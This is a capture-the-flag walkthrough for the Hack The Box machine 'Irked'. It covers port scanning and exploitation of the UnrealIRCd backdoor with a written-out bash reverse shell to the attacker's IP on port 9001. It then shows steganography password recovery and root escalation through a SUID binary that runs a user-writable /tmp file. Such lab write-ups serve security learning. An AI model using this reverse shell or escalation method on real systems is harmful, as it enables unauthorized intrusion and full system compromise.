User:
1. Scan the box with `nmap -sC -sV -oN irked.nmap 10.10.10.117` to check the services on the first 1000 ports
2. Port 80 is open, we see there is a mention of IRC by going on a browser
3. Rescan the box fully with `nmap -p- -oN irked_full.nmap 10.10.10.117` to check all ports open
4. There is an IRC service listening on port 8067, look up the RFC for IRC
5. Google the IRC version (Unreal3.2.8.1), we see there is a backdoor command execution
6. We can do `searchsploit unreal` to check and see if there's an exploit for it in the database, there actually is, we can either use it with `msfconsole`, or manually by `echo "AB;bash -c 'bash -i >& /dev/tcp/10.10.14.21/9001 0>&1'"` to send a shell (nc needs to listen on port 9001), then `python -c 'import tty;tty.spawn("/bin/bash")'` to spawn a shell, then stopping the nc listening process, `stty -raw -echo` to get rid of commands echoing, `fg` to go back to nc, and finally `export TERM=xterm` to be able to do `clear`. And voilà! 
7. We are now user `icrd`, and need to read a file owned by `djmardov` with permissions 600, so we cannot read it as `icrd`. In `Documents/.backup` we see `Super elite steg backup pw` with a cheating code.
8. Downloading the image that was shown by the http server, we run `steghide extract -sf irked.jpg -p PASSWORD` with the cheating code found in `.backup` as PASSWORD, and we get a nice pass.txt, which we guess is the password to ssh into djmardov's account, and it is, so that's it for user!

Root:
1. Running LinEnum on the box, we see an interesting SUID binary modified in 2018, `/usr/bin/listuser`. Analyzing it with ltrace shows:these system calls:
```
setuid(0)
system("/tmp/listusers")
```
2. `/tmp/listusers` is actually run as root, but is writeble by our user, so modifying it to add a `bash` command and making it executable does the trick, by running `listuser` we get a root shell!
